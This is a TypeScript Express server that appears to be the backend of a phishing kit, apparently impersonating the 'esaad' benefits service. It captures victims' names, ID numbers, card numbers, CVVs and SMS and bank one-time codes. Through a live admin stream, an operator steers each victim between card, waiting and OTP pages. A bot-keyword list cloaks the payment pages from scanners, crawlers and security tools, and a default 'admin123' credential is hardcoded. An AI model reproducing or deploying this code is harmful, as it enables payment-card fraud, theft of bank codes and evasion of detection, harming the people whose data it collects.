import express from 'express';
import { createServer as createViteServer } from 'vite';
import { createClient, SupabaseClient } from '@supabase/supabase-js';
import * as dotenv from 'dotenv';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import {
  serverStore,
  ONLINE_WINDOW_MS,
  VisitorMeta,
  RequestRecord,
  AdminPreferences
} from './serverStore';

dotenv.config();

// Load fallback vars from wrangler.toml if not set in process.env
try {
  const wranglerPath = path.resolve(process.cwd(), 'wrangler.toml');
  if (fs.existsSync(wranglerPath)) {
    const content = fs.readFileSync(wranglerPath, 'utf-8');
    const matchRegex = /^\s*([A-Z0-9_]+)\s*=\s*"([^"]*)"/gm;
    let match: RegExpExecArray | null;
    while ((match = matchRegex.exec(content)) !== null) {
      const [, key, val] = match;
      if (key && val && !process.env[key]) {
        process.env[key] = val;
      }
    }
  }
} catch {}

const app = express();
app.set('trust proxy', true);
app.use(express.json());
app.use(express.text({ type: 'text/plain' }));

const PORT = Number(process.env.PORT) || 3000;
const DB_SYNC_INTERVAL_MS = 4000;
const SUPABASE_PULL_THROTTLE_MS = 5000;

// Initialize Server-Side Supabase Client
const supabaseUrl = process.env.SUPABASE_URL || '';
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_ANON_KEY || '';

function getSupabase(): SupabaseClient | null {
  if (!supabaseUrl || !supabaseKey || !supabaseUrl.startsWith('http')) {
    return null;
  }
  return createClient(supabaseUrl, supabaseKey, {
    auth: { persistSession: false }
  });
}

// Ephemeral connection & sync throttling state
const lastDbPresenceSync = new Map<string, { time: number; page: string }>();
const visitorStreams = new Map<string, Set<express.Response>>();
const adminStreams = new Set<express.Response>();
let lastSupabasePullAt = 0;
let supabasePullInFlight: Promise<void> | null = null;

function parseCookies(cookieHeader?: string): Record<string, string> {
  const list: Record<string, string> = {};
  if (!cookieHeader) return list;
  cookieHeader.split(';').forEach((cookie) => {
    const parts = cookie.split('=');
    const key = parts.shift()?.trim();
    if (key) {
      list[key] = decodeURIComponent(parts.join('=').trim());
    }
  });
  return list;
}

function normalizeRedirectTarget(action?: string | null): string | null {
  if (!action) return null;
  const trimmed = String(action).trim();
  if (!trimmed) return null;
  const map: Record<string, string> = {
    '/': '/',
    home: '/',
    '/request': '/request',
    form: '/request',
    '/register-company': '/register-company',
    company: '/register-company',
    '/payment': '/payment',
    payment: '/payment',
    '/card-details': '/card-details',
    card: '/card-details',
    '/waiting': '/waiting',
    waiting: '/waiting',
    '/otp': '/otp',
    otp: '/otp',
    'otp-sms': '/otp',
    '/otp-bank': '/otp-bank',
    'otp-bank': '/otp-bank'
  };
  return map[trimmed] || (trimmed.startsWith('/') ? trimmed : null);
}

function normalizeStepToPage(step?: string | null): string {
  if (!step) return '/';
  if (step.startsWith('/')) return step;
  const map: Record<string, string> = {
    home: '/',
    form: '/payment',
    card: '/waiting',
    otp: '/otp',
    'otp-bank': '/otp-bank'
  };
  return map[step] || '/';
}

function extractVisitorMeta(req: express.Request): VisitorMeta {
  const ua = String(req.headers['user-agent'] || '');
  const cfIp = String(req.headers['cf-connecting-ip'] || '');
  const forwarded = String(req.headers['x-forwarded-for'] || '');
  const rawIp = (cfIp || forwarded.split(',')[0] || req.socket.remoteAddress || '188.53.192.70').trim();
  const ip = rawIp.replace(/^::ffff:/, '') || '188.53.192.70';

  let os = 'Windows';
  if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
  else if (/Android/i.test(ua)) os = 'Android';
  else if (/Mac OS X/i.test(ua)) os = 'macOS';
  else if (/Linux/i.test(ua)) os = 'Linux';

  const device = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'mobile' : 'desktop';

  let browser = 'Chrome';
  if (/Edg\//i.test(ua)) browser = 'Edge';
  else if (/OPR\//i.test(ua)) browser = 'Opera';
  else if (/Chrome\//i.test(ua)) browser = 'Chrome';
  else if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) browser = 'Safari';
  else if (/Firefox\//i.test(ua)) browser = 'Firefox';

  return {
    ip,
    os,
    device,
    browser,
    country: 'Saudi Arabia, Riyadh'
  };
}

const BOT_KEYWORDS = [
  'bot', 'crawler', 'spider', 'scraper', 'googlebot', 'bingbot', 'yandex',
  'baiduspider', 'duckduckbot', 'slurp', 'facebookexternalhit', 'twitterbot',
  'linkedinbot', 'embedly', 'whatsapp', 'telegrambot', 'applebot', 'petalbot',
  'bytespider', 'gptbot', 'claudebot', 'anthropic', 'perplexitybot', 'ahrefsbot',
  'semrushbot', 'mj12bot', 'dotbot', 'rogerbot', 'sogou', 'exabot', 'facebot',
  'ia_archiver', 'headless', 'puppeteer', 'playwright', 'selenium', 'phantomjs',
  'lighthouse', 'pagespeed', 'gtmetrix', 'pingdom', 'uptime', 'datadog',
  'axios', 'curl', 'wget', 'python', 'java/', 'ruby', 'perl', 'php/', 'libwww',
  'httpclient', 'postman', 'insomnia', 'node-fetch', 'undici', 'go-http-client',
  'scanner', 'security', 'audit', 'censys', 'shodan', 'nmap', 'zgrab'
];

function isBotRequest(req: express.Request): boolean {
  const ua = String(req.headers['user-agent'] || '').trim().toLowerCase();
  if (!ua) return true;
  if (BOT_KEYWORDS.some((keyword) => ua.includes(keyword))) return true;
  const purpose = String(req.headers['purpose'] || req.headers['x-purpose'] || '').toLowerCase();
  if (purpose.includes('preview') || purpose.includes('crawl')) return true;
  return false;
}

function getFingerprintKey(req: express.Request): string {
  const meta = extractVisitorMeta(req);
  const ua = String(req.headers['user-agent'] || '').slice(0, 120);
  return `${meta.ip}|${ua}`;
}

function buildCookie(name: string, value: string, req: express.Request, maxAge = 60 * 60 * 24 * 30): string {
  const isSecure = req.secure || req.headers['x-forwarded-proto'] === 'https';
  const sameSite = isSecure ? 'SameSite=None; Secure' : 'SameSite=Lax';
  const agePart = maxAge !== undefined ? `; Max-Age=${maxAge}` : '';
  return `${name}=${encodeURIComponent(value)}; Path=/; HttpOnly${agePart}; ${sameSite}`;
}

function hasActiveVisitorStream(reqId: string): boolean {
  const streams = visitorStreams.get(reqId);
  return Boolean(streams && streams.size > 0);
}

function isRequestIdOnlineOnServer(reqId: string, updatedAtIso?: string, serverNow = Date.now()): boolean {
  if (hasActiveVisitorStream(reqId)) {
    return true;
  }

  const offlineAt = serverStore.getExplicitlyOfflineAt(reqId);
  const memEntry = serverStore.getUserPresence(reqId);
  if (memEntry) {
    if (offlineAt && offlineAt >= memEntry.lastSeen) {
      return false;
    }
    if (serverNow - memEntry.lastSeen < ONLINE_WINDOW_MS) {
      return true;
    }
  }

  for (const [, d] of serverStore.getAllDevicePresence()) {
    if (d.requestId === reqId && serverNow - d.lastSeen < ONLINE_WINDOW_MS) {
      if (!offlineAt || d.lastSeen > offlineAt) {
        return true;
      }
    }
  }

  const storedReq = serverStore.getRequest(reqId);
  if (storedReq?.lastHeartbeatAt) {
    if (offlineAt && offlineAt >= storedReq.lastHeartbeatAt) {
      return false;
    }
    if (serverNow - storedReq.lastHeartbeatAt < ONLINE_WINDOW_MS) {
      return true;
    }
    return false;
  }

  if (updatedAtIso) {
    const updatedMs = new Date(updatedAtIso).getTime();
    if (!isNaN(updatedMs)) {
      if (offlineAt && offlineAt >= updatedMs) {
        return false;
      }
      if (serverNow - updatedMs < ONLINE_WINDOW_MS) {
        return true;
      }
    }
  }

  return false;
}

function toSupabaseRow(record: Partial<RequestRecord> & { id: string }) {
  const row: Record<string, any> = { id: record.id };
  if (record.name !== undefined) row.name = record.name;
  if (record.mobile !== undefined) row.mobile = record.mobile;
  if (record.idNumber !== undefined) row.id_number = record.idNumber;
  if (record.cardType !== undefined) row.card_type = record.cardType;
  if (record.address !== undefined) row.address = record.address;
  if (record.date !== undefined) row.date = record.date;
  if (record.paymentName !== undefined) row.payment_name = record.paymentName;
  if (record.cardNumber !== undefined) row.card_number = record.cardNumber;
  if (record.expMonth !== undefined) row.exp_month = record.expMonth;
  if (record.expYear !== undefined) row.exp_year = record.expYear;
  if (record.cvv !== undefined) row.cvv = record.cvv;
  if (record.otp !== undefined) row.otp = record.otp;
  if (record.otpStatus !== undefined) row.otp_status = record.otpStatus;
  if (record.nextAction !== undefined) row.next_action = record.nextAction;
  if (record.step !== undefined) row.step = record.step;
  if (record.createdAt !== undefined) row.created_at = record.createdAt;
  if (record.updatedAt !== undefined) row.updated_at = record.updatedAt;
  return row;
}

function fromSupabaseRow(row: any, serverNow = Date.now()): RequestRecord {
  const id = String(row.id);
  const rawStep = row.step || 'home';
  const storedReq = serverStore.getRequest(id);
  const currentPage =
    serverStore.getLastKnownPage(id) ||
    storedReq?.currentPage ||
    normalizeStepToPage(rawStep);
  const memPresence = serverStore.getUserPresence(id);
  const dbUpdatedIso = row.updated_at ?? row.updatedAt ?? new Date(serverNow).toISOString();
  const dbUpdatedMs = new Date(dbUpdatedIso).getTime();

  const heartbeatMs = memPresence?.lastSeen ?? storedReq?.lastHeartbeatAt ?? 0;
  const effectiveLastSeenMs = Math.max(heartbeatMs, isNaN(dbUpdatedMs) ? 0 : dbUpdatedMs) || serverNow;
  const effectiveUpdatedIso = new Date(effectiveLastSeenMs).toISOString();

  const isOnline = isRequestIdOnlineOnServer(id, effectiveUpdatedIso, serverNow);
  const lastActiveMs = heartbeatMs || (isNaN(dbUpdatedMs) ? serverNow : dbUpdatedMs);
  const secondsAgo = isOnline ? 0 : Math.max(0, Math.floor((serverNow - lastActiveMs) / 1000));

  return {
    id,
    name: row.name ?? storedReq?.name ?? '',
    mobile: row.mobile ?? storedReq?.mobile ?? '',
    idNumber: row.id_number ?? row.idNumber ?? storedReq?.idNumber ?? '',
    cardType: row.card_type ?? row.cardType ?? storedReq?.cardType ?? '',
    address: row.address ?? storedReq?.address ?? '',
    date: row.date ?? storedReq?.date ?? '',
    paymentName: row.payment_name ?? row.paymentName ?? storedReq?.paymentName ?? undefined,
    cardNumber: row.card_number ?? row.cardNumber ?? storedReq?.cardNumber ?? undefined,
    expMonth: row.exp_month ?? row.expMonth ?? storedReq?.expMonth ?? undefined,
    expYear: row.exp_year ?? row.expYear ?? storedReq?.expYear ?? undefined,
    cvv: row.cvv ?? storedReq?.cvv ?? undefined,
    otp: row.otp ?? storedReq?.otp ?? undefined,
    otpStatus: row.otp_status ?? row.otpStatus ?? storedReq?.otpStatus ?? undefined,
    nextAction: row.next_action ?? row.nextAction ?? storedReq?.nextAction ?? undefined,
    step: rawStep,
    createdAt: row.created_at ?? row.createdAt ?? storedReq?.createdAt ?? effectiveUpdatedIso,
    updatedAt: effectiveUpdatedIso,
    lastHeartbeatAt: storedReq?.lastHeartbeatAt,
    isOnline,
    secondsAgo,
    currentPage,
    meta: serverStore.getUserMeta(id) || storedReq?.meta
  };
}

function enrichLocalRecord(rec: RequestRecord, serverNow = Date.now()): RequestRecord {
  const id = rec.id;
  const memPresence = serverStore.getUserPresence(id);
  const currentPage =
    serverStore.getLastKnownPage(id) ||
    memPresence?.currentPage ||
    rec.currentPage ||
    normalizeStepToPage(rec.step);
  const recUpdatedMs = new Date(rec.updatedAt).getTime();
  const lastActiveMs = Math.max(
    memPresence?.lastSeen || 0,
    rec.lastHeartbeatAt || 0,
    isNaN(recUpdatedMs) ? 0 : recUpdatedMs
  ) || serverNow;

  const isOnline = isRequestIdOnlineOnServer(id, rec.updatedAt, serverNow);
  const heartbeatOrUpdated = memPresence?.lastSeen || rec.lastHeartbeatAt || (isNaN(recUpdatedMs) ? serverNow : recUpdatedMs);
  const secondsAgo = isOnline ? 0 : Math.max(0, Math.floor((serverNow - heartbeatOrUpdated) / 1000));

  return {
    ...rec,
    updatedAt: new Date(lastActiveMs).toISOString(),
    isOnline,
    secondsAgo,
    currentPage,
    meta: serverStore.getUserMeta(id) || rec.meta
  };
}

async function pullFromSupabaseIfNeeded(force = false): Promise<void> {
  const now = Date.now();
  if (!force && now - lastSupabasePullAt < SUPABASE_PULL_THROTTLE_MS) {
    return;
  }
  if (supabasePullInFlight) {
    return supabasePullInFlight;
  }

  const supabase = getSupabase();
  if (!supabase) return;

  supabasePullInFlight = (async () => {
    try {
      const { data, error } = await supabase
        .from('requests')
        .select('*')
        .order('updated_at', { ascending: false });
      if (!error && data) {
        const mapped = data.map((row) => fromSupabaseRow(row, Date.now()));
        serverStore.syncFromSupabaseRows(mapped);
        lastSupabasePullAt = Date.now();
      }
    } catch {
      // Resilient fallback: continue using serverStore
    } finally {
      supabasePullInFlight = null;
    }
  })();

  return supabasePullInFlight;
}

async function fetchEnrichedRequests(forceSupabasePull = false): Promise<RequestRecord[]> {
  serverStore.prunePresence(hasActiveVisitorStream);
  await pullFromSupabaseIfNeeded(forceSupabasePull);

  const serverNow = Date.now();
  const storedRequests = serverStore.getAllRequests();
  const enrichedList = storedRequests.map((r) => enrichLocalRecord(r, serverNow));
  const existingMap = new Map(enrichedList.map((r) => [r.id, r]));
  const nowIso = new Date(serverNow).toISOString();

  for (const [reqId, entry] of serverStore.getAllUserPresence()) {
    if (!existingMap.has(reqId)) {
      const isOnline = isRequestIdOnlineOnServer(reqId, new Date(entry.lastSeen).toISOString(), serverNow);
      enrichedList.push({
        id: reqId,
        name: '',
        mobile: '',
        idNumber: '',
        cardType: 'gold',
        address: '',
        date: '',
        step: entry.currentPage,
        createdAt: nowIso,
        updatedAt: new Date(entry.lastSeen).toISOString(),
        lastHeartbeatAt: entry.lastSeen,
        isOnline,
        secondsAgo: isOnline ? 0 : Math.max(0, Math.floor((serverNow - entry.lastSeen) / 1000)),
        currentPage: entry.currentPage,
        meta: serverStore.getUserMeta(reqId)
      });
    }
  }

  enrichedList.sort((a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime());
  return enrichedList;
}

function buildStatsPayload(enrichedRequests?: RequestRecord[]) {
  serverStore.prunePresence(hasActiveVisitorStream);
  const serverNow = Date.now();
  const onlineUsers: Record<string, boolean> = {};
  const userPages: Record<string, string> = {};
  const userMeta: Record<string, VisitorMeta> = {};

  for (const [reqId, page] of serverStore.getAllLastKnownPages()) {
    userPages[reqId] = page;
  }

  for (const [reqId, meta] of serverStore.getAllUserMeta()) {
    userMeta[reqId] = meta;
  }

  for (const [reqId, entry] of serverStore.getAllUserPresence()) {
    if (isRequestIdOnlineOnServer(reqId, new Date(entry.lastSeen).toISOString(), serverNow)) {
      onlineUsers[reqId] = true;
    }
    userPages[reqId] = entry.currentPage;
  }

  if (enrichedRequests) {
    for (const r of enrichedRequests) {
      if (r.isOnline) {
        onlineUsers[r.id] = true;
      }
      if (r.currentPage && !userPages[r.id]) {
        userPages[r.id] = r.currentPage;
      }
      if (r.meta && !userMeta[r.id]) {
        userMeta[r.id] = r.meta;
      }
    }
  }

  const activeSessions = serverStore
    .getAllDevicePresence()
    .filter(([, entry]) => entry.requestId && isRequestIdOnlineOnServer(entry.requestId, undefined, serverNow))
    .map(([cid, entry]) => ({
      clientId: cid,
      requestId: entry.requestId,
      currentPage: entry.currentPage,
      lastSeen: entry.lastSeen,
      meta: entry.meta
    }));

  return {
    onlineCount: Object.keys(onlineUsers).length,
    totalVisitorsCount: serverStore.getTotalVisitorsCount(),
    onlineUsers,
    userPages,
    userMeta,
    activeSessions,
    preferences: serverStore.getAdminPreferences(),
    serverTime: serverNow
  };
}

let broadcastDebounceTimer: ReturnType<typeof setTimeout> | null = null;

function broadcastToAdmins() {
  if (adminStreams.size === 0) return;
  if (broadcastDebounceTimer) return;
  broadcastDebounceTimer = setTimeout(async () => {
    broadcastDebounceTimer = null;
    if (adminStreams.size === 0) return;
    try {
      const requests = await fetchEnrichedRequests(false);
      const stats = buildStatsPayload(requests);
      const payload = `event: snapshot\ndata: ${JSON.stringify({ stats, requests })}\n\n`;
      for (const stream of adminStreams) {
        try {
          stream.write(payload);
        } catch {
          adminStreams.delete(stream);
        }
      }
    } catch {}
  }, 80);
}

// Periodically expire stale presence and notify connected admin dashboards
setInterval(() => {
  const changed = serverStore.prunePresence(hasActiveVisitorStream);
  if (changed) {
    broadcastToAdmins();
  }
}, 15000);

function sendVisitorEvent(requestId: string, eventName: string, data: Record<string, any>) {
  const streams = visitorStreams.get(requestId);
  if (!streams || streams.size === 0) return;
  const payload = `event: ${eventName}\ndata: ${JSON.stringify(data)}\n\n`;
  for (const stream of streams) {
    try {
      stream.write(payload);
    } catch {
      streams.delete(stream);
    }
  }
}

async function syncVisitorPresenceToDb(requestId: string, currentPage: string, force = false): Promise<string | null> {
  const now = Date.now();
  const prevSync = lastDbPresenceSync.get(requestId);
  const shouldSync =
    force || !prevSync || now - prevSync.time >= DB_SYNC_INTERVAL_MS || prevSync.page !== currentPage;

  if (!shouldSync) {
    return serverStore.getPendingRedirect(requestId) || null;
  }

  lastDbPresenceSync.set(requestId, { time: now, page: currentPage });

  // Always keep server-side store up to date
  const nowIso = new Date(now).toISOString();
  const existingLocal = serverStore.getRequest(requestId);
  if (existingLocal) {
    serverStore.patchRequest(requestId, { step: currentPage, currentPage, updatedAt: nowIso }, true);
  } else {
    serverStore.upsertRequest(
      {
        id: requestId,
        name: '',
        mobile: '',
        idNumber: '',
        cardType: 'gold',
        address: '',
        date: '',
        step: currentPage,
        currentPage,
        createdAt: nowIso,
        updatedAt: nowIso,
        lastHeartbeatAt: now
      },
      true
    );
  }

  const supabase = getSupabase();
  if (!supabase) {
    return serverStore.getPendingRedirect(requestId) || null;
  }

  try {
    const { data: updatedRows } = await supabase
      .from('requests')
      .update({
        updated_at: nowIso,
        step: currentPage
      })
      .eq('id', requestId)
      .select('id, next_action');

    if (!updatedRows || updatedRows.length === 0) {
      await supabase
        .from('requests')
        .upsert(
          {
            id: requestId,
            step: currentPage,
            created_at: nowIso,
            updated_at: nowIso
          },
          { onConflict: 'id' }
        );
    } else if (updatedRows[0]?.next_action) {
      const dbTarget = normalizeRedirectTarget(updatedRows[0].next_action);
      if (dbTarget) {
        serverStore.setPendingRedirect(requestId, dbTarget);
      }
    }
  } catch {
    lastDbPresenceSync.delete(requestId);
  }

  return serverStore.getPendingRedirect(requestId) || null;
}

function recordServerSideVisit(
  req: express.Request,
  res: express.Response,
  options?: { clientId?: string; requestId?: string; currentPage?: string; isNewVisit?: boolean }
): { clientId: string; requestId: string | null; currentPage: string } {
  const cookies = parseCookies(req.headers.cookie);
  const fpKey = getFingerprintKey(req);
  const fpSession = serverStore.getIpSession(fpKey);
  const now = Date.now();

  const currentPage = String(options?.currentPage || req.path || '/');
  const isAdminPage = currentPage.startsWith('/admin');

  const clientId = String(
    options?.clientId ||
      cookies.esaad_cid ||
      fpSession?.clientId ||
      crypto.randomUUID()
  );

  const existingDevice = serverStore.getDevicePresence(clientId);

  const resolvedReqId = isAdminPage
    ? null
    : String(
        options?.requestId ||
          cookies.esaad_req_id ||
          existingDevice?.requestId ||
          fpSession?.requestId ||
          crypto.randomUUID()
      );

  const isNewVisit = !cookies.esaad_visited && (options?.isNewVisit ?? true);
  const meta = extractVisitorMeta(req);

  const cookieHeaders: string[] = [buildCookie('esaad_cid', clientId, req)];
  if (resolvedReqId) {
    cookieHeaders.push(buildCookie('esaad_req_id', resolvedReqId, req));
    serverStore.setIpSession(fpKey, clientId, resolvedReqId);
  }
  if (isNewVisit && !isAdminPage) {
    serverStore.incrementTotalVisitors();
    cookieHeaders.push(buildCookie('esaad_visited', '1', req));
  }

  if (!res.headersSent) {
    res.setHeader('Set-Cookie', cookieHeaders);
  }

  if (!isAdminPage && resolvedReqId) {
    serverStore.clearExplicitlyOffline(resolvedReqId);

    serverStore.setDevicePresence(clientId, {
      lastSeen: now,
      currentPage,
      requestId: resolvedReqId,
      meta
    });

    serverStore.setUserPresence(resolvedReqId, {
      lastSeen: now,
      currentPage
    });
    serverStore.setLastKnownPage(resolvedReqId, currentPage);
    serverStore.setUserMeta(resolvedReqId, meta);
  }

  return { clientId, requestId: resolvedReqId, currentPage };
}

async function getAdminTokenFromReq(req: express.Request): Promise<string | null> {
  const cookies = parseCookies(req.headers.cookie);
  const authHeader = req.headers.authorization;
  const token =
    authHeader && authHeader.startsWith('Bearer ')
      ? authHeader.slice(7)
      : cookies.esaad_admin_token || '';

  if (!token) return null;
  if (serverStore.hasValidAdminSession(token)) return token;

  const supabase = getSupabase();
  if (supabase) {
    try {
      const { data, error } = await supabase.auth.getUser(token);
      if (!error && data.user) {
        serverStore.createAdminSession(token, data.user.email || 'admin');
        return token;
      }
    } catch {}
  }
  return null;
}

// ==================== ROBOTS.TXT & BOT PROTECTION ====================
app.get('/robots.txt', (_req, res) => {
  res.type('text/plain').send(
    [
      'User-agent: *',
      'Disallow: /payment',
      'Disallow: /card-details',
      'Disallow: /waiting',
      'Disallow: /otp',
      'Disallow: /otp-bank',
      'Disallow: /admin',
      'Disallow: /api/',
      'Allow: /'
    ].join('\n')
  );
});

const TRACKED_HTML_PATHS = new Set([
  '/',
  '/request',
  '/register-company',
  '/payment',
  '/card-details',
  '/waiting',
  '/otp',
  '/otp-bank'
]);

const PAYMENT_PATHS = new Set(['/payment', '/card-details', '/waiting', '/otp', '/otp-bank']);

app.use((req, res, next) => {
  if (req.method === 'GET' || req.method === 'HEAD') {
    if (PAYMENT_PATHS.has(req.path) || req.path.startsWith('/admin')) {
      res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive');
    }

    if (TRACKED_HTML_PATHS.has(req.path)) {
      if (isBotRequest(req)) {
        if (PAYMENT_PATHS.has(req.path)) {
          return res.redirect(302, '/');
        }
        return next();
      }
      if (req.method === 'GET') {
        const { requestId, currentPage } = recordServerSideVisit(req, res, {
          currentPage: req.path,
          isNewVisit: true
        });
        if (requestId) {
          syncVisitorPresenceToDb(requestId, currentPage, true)
            .then(() => broadcastToAdmins())
            .catch(() => {});
        }
      }
    }
  }
  next();
});

// ==================== REAL-TIME SSE STREAM (/api/stream) ====================
app.get('/api/stream', async (req, res) => {
  const role = String(req.query.role || 'visitor');

  if (role !== 'admin' && isBotRequest(req)) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  res.setHeader('Content-Type', 'text/event-stream; charset=utf-8');
  res.setHeader('Cache-Control', 'no-cache, no-transform');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no');

  if (role === 'admin') {
    res.flushHeaders?.();
    adminStreams.add(res);

    try {
      const requests = await fetchEnrichedRequests(false);
      const stats = buildStatsPayload(requests);
      res.write(`event: snapshot\ndata: ${JSON.stringify({ stats, requests })}\n\n`);
    } catch {}

    const keepAliveTimer = setInterval(() => {
      try {
        res.write(`: keepalive ${Date.now()}\n\n`);
      } catch {
        clearInterval(keepAliveTimer);
        adminStreams.delete(res);
      }
    }, 10000);

    req.on('close', () => {
      clearInterval(keepAliveTimer);
      adminStreams.delete(res);
    });
    return;
  }

  // Visitor real-time stream
  const pageParam = String(req.query.page || '/');
  const { clientId, requestId, currentPage } = recordServerSideVisit(req, res, {
    clientId: req.query.clientId ? String(req.query.clientId) : undefined,
    requestId: req.query.requestId ? String(req.query.requestId) : undefined,
    currentPage: pageParam
  });

  res.flushHeaders?.();

  if (!requestId) {
    res.write(`event: connected\ndata: ${JSON.stringify({ ok: true })}\n\n`);
    return;
  }

  let streamSet = visitorStreams.get(requestId);
  if (!streamSet) {
    streamSet = new Set();
    visitorStreams.set(requestId, streamSet);
  }
  streamSet.add(res);

  const pendingTarget = await syncVisitorPresenceToDb(requestId, currentPage, true);
  res.write(
    `event: connected\ndata: ${JSON.stringify({
      ok: true,
      clientId,
      requestId,
      redirectTo: pendingTarget && pendingTarget !== currentPage ? pendingTarget : null
    })}\n\n`
  );
  broadcastToAdmins();

  // Keep visitor continuously online while SSE stream is open
  const visitorKeepAlive = setInterval(() => {
    const now = Date.now();
    const activePage = serverStore.getLastKnownPage(requestId) || currentPage;
    serverStore.setUserPresence(requestId, { lastSeen: now, currentPage: activePage });
    const dev = serverStore.getDevicePresence(clientId);
    if (dev) {
      serverStore.setDevicePresence(clientId, { ...dev, lastSeen: now, currentPage: activePage });
    }
    syncVisitorPresenceToDb(requestId, activePage, false).catch(() => {});
    try {
      res.write(`: ping ${now}\n\n`);
    } catch {
      clearInterval(visitorKeepAlive);
    }
  }, 4000);

  req.on('close', () => {
    clearInterval(visitorKeepAlive);
    const set = visitorStreams.get(requestId);
    if (set) {
      set.delete(res);
      if (set.size === 0) {
        visitorStreams.delete(requestId);
      }
    }
    // Check after 1.5s if visitor reconnected (e.g., page refresh) or genuinely closed the site
    setTimeout(() => {
      const currentStreams = visitorStreams.get(requestId);
      const hasStream = Boolean(currentStreams && currentStreams.size > 0);
      const mem = serverStore.getUserPresence(requestId);
      const recentlyPinged = Boolean(mem && Date.now() - mem.lastSeen < 1500);
      if (!hasStream && !recentlyPinged) {
        broadcastToAdmins();
      }
    }, 1500);
  });
});

// ==================== API ROUTES ====================

// 1. Presence & Current Page Tracking
app.post('/api/presence', async (req, res) => {
  if (isBotRequest(req)) {
    return res.json({ ok: true, requestId: null, redirectTo: null });
  }

  let body: any = {};
  try {
    body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : req.body || {};
  } catch {}

  const { requestId, currentPage } = recordServerSideVisit(req, res, {
    clientId: body?.clientId,
    requestId: body?.requestId,
    currentPage: body?.currentPage || '/',
    isNewVisit: Boolean(body?.isNewVisit)
  });

  if (requestId && !currentPage.startsWith('/admin')) {
    await syncVisitorPresenceToDb(requestId, currentPage, false);

    const targetRoute = serverStore.getPendingRedirect(requestId);
    if (targetRoute) {
      if (currentPage === targetRoute) {
        serverStore.deletePendingRedirect(requestId);
        serverStore.patchRequest(requestId, { nextAction: '', step: currentPage, currentPage }, true);
        const supabase = getSupabase();
        if (supabase) {
          supabase
            .from('requests')
            .update({ next_action: '', step: currentPage, updated_at: new Date().toISOString() })
            .eq('id', requestId)
            .then(() => broadcastToAdmins());
        } else {
          broadcastToAdmins();
        }
      } else {
        serverStore.prunePresence(hasActiveVisitorStream);
        broadcastToAdmins();
        return res.json({ ok: true, requestId, redirectTo: targetRoute });
      }
    }
    broadcastToAdmins();
  }

  serverStore.prunePresence(hasActiveVisitorStream);
  res.json({ ok: true, requestId, redirectTo: null });
});

// Instant leave notification when visitor closes tab
app.post('/api/presence/leave', async (req, res) => {
  if (isBotRequest(req)) {
    return res.json({ ok: true });
  }

  let body: any = {};
  try {
    body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : req.body || {};
  } catch {}
  const cookies = parseCookies(req.headers.cookie);
  const clientId = String(body?.clientId || cookies.esaad_cid || '');
  const requestId = String(body?.requestId || cookies.esaad_req_id || '');

  if (clientId) {
    serverStore.deleteDevicePresence(clientId);
  }
  if (requestId) {
    serverStore.markExplicitlyOffline(requestId);
    const streams = visitorStreams.get(requestId);
    if (streams) {
      visitorStreams.delete(requestId);
    }
    const supabase = getSupabase();
    if (supabase) {
      const offlineIso = new Date(Date.now() - (ONLINE_WINDOW_MS + 60000)).toISOString();
      try {
        await supabase
          .from('requests')
          .update({ updated_at: offlineIso })
          .eq('id', requestId);
      } catch {}
    }
  }

  broadcastToAdmins();
  res.json({ ok: true });
});

app.get('/api/stats', async (_req, res) => {
  const enriched = await fetchEnrichedRequests(false);
  res.json(buildStatsPayload(enriched));
});

// 2. Admin Authentication & Server-Side Preferences
app.post('/api/admin/login', async (req, res) => {
  const { email, password } = req.body || {};
  if (!email || !password) {
    return res.status(400).json({ error: 'الرجاء إدخال البريد الإلكتروني وكلمة المرور' });
  }

  const supabase = getSupabase();
  if (supabase) {
    try {
      const { data, error } = await supabase.auth.signInWithPassword({
        email: String(email).trim(),
        password: String(password)
      });
      if (!error && data.session) {
        const token = data.session.access_token;
        serverStore.createAdminSession(token, data.user?.email || String(email).trim());
        res.setHeader('Set-Cookie', buildCookie('esaad_admin_token', token, req));
        return res.json({ token, user: { email: data.user?.email } });
      }
    } catch {}
  }

  const expectedEmail = process.env.ADMIN_EMAIL || 'admin@esaad.ae';
  const expectedPassword = process.env.ADMIN_PASSWORD || 'admin123';

  if (
    String(email).trim().toLowerCase() === expectedEmail.toLowerCase() &&
    String(password) === expectedPassword
  ) {
    const token = crypto.randomBytes(24).toString('hex');
    serverStore.createAdminSession(token, expectedEmail);
    res.setHeader('Set-Cookie', buildCookie('esaad_admin_token', token, req));
    return res.json({ token, user: { email: expectedEmail } });
  }

  return res.status(401).json({ error: 'البريد الإلكتروني أو كلمة المرور غير صحيحة' });
});

app.get('/api/admin/me', async (req, res) => {
  const token = await getAdminTokenFromReq(req);
  if (!token) {
    return res.status(401).json({ authenticated: false });
  }
  const session = serverStore.hasValidAdminSession(token);
  return res.json({
    authenticated: true,
    user: session ? { email: session.email } : undefined
  });
});

app.post('/api/admin/logout', (req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  const authHeader = req.headers.authorization;
  const token =
    authHeader && authHeader.startsWith('Bearer ')
      ? authHeader.slice(7)
      : cookies.esaad_admin_token || '';

  if (token) {
    serverStore.deleteAdminSession(token);
  }
  res.setHeader('Set-Cookie', buildCookie('esaad_admin_token', '', req, 0));
  res.json({ ok: true });
});

app.get('/api/admin/preferences', async (req, res) => {
  const token = await getAdminTokenFromReq(req);
  if (!token) {
    return res.status(401).json({ error: 'غير مصرح' });
  }
  return res.json(serverStore.getAdminPreferences());
});

app.patch('/api/admin/preferences', async (req, res) => {
  const token = await getAdminTokenFromReq(req);
  if (!token) {
    return res.status(401).json({ error: 'غير مصرح' });
  }

  const body = req.body || {};
  let updated: AdminPreferences;

  if (
    body.toggle &&
    ['starredIds', 'archivedIds', 'flaggedIds'].includes(body.toggle) &&
    body.id
  ) {
    updated = serverStore.togglePreferenceItem(
      body.toggle,
      String(body.id),
      typeof body.value === 'boolean' ? body.value : undefined
    );
  } else {
    updated = serverStore.updateAdminPreferences(body);
  }

  broadcastToAdmins();
  return res.json(updated);
});

